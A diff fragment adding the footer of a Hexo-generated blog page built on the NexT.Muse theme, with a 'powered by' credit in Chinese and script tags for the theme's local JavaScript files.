+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
